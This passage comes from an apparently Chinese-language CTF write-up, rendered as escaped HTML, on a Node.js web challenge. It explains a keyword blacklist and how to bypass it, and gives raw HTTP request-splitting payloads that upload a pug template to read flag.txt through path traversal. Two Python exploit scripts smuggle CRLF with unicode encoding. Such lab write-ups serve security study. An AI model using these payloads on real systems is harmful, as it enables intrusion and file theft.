&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// urlencode绕过 字符串拼接绕过 unicode绕过
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有上面两个题的铺垫，这个代码就会好理解一些&lt;/p>
&lt;p>这个题改编的地方在于多了一个任意文件上传，可以通过&lt;code>../&lt;/code>的mimetype来进行目录穿越，pug渲染会借助我们上传的.pug模板，在这里包含flag.txt&lt;/p>
&lt;p>通过抓包修改内容来做payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/file_upload&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">amiz&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">266&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: /../template
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>doctype html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> head
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> style
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: amiz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection: close
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>amiz:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用上面我们已经构造好的通用exp.py构造payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0122&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SINGLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0127&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: /../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">amiz: &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SINGLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png" alt="image-20211206133327186">&lt;/p>
&lt;p>成功得到flag，本地抓包看一下具体情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png" alt="image-20211207011253660">&lt;/p>
&lt;p>在exp中我们对一些特殊字符做了unicode编码，被编码的字符应该包括以下这些&lt;/p>
&lt;pre tabindex="0">&lt;code>! &amp;amp; ` ; + \ / &amp;#34; &amp;#39; &amp;lt;SPACE&amp;gt; &amp;lt;CRLF&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png" alt="image-20211206133438315">&lt;/p>
&lt;p>（！！！注意 这里很可能有遗漏或者不必要的 请根据实际情况修改&lt;/p>
&lt;p>下面是完全编码的exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
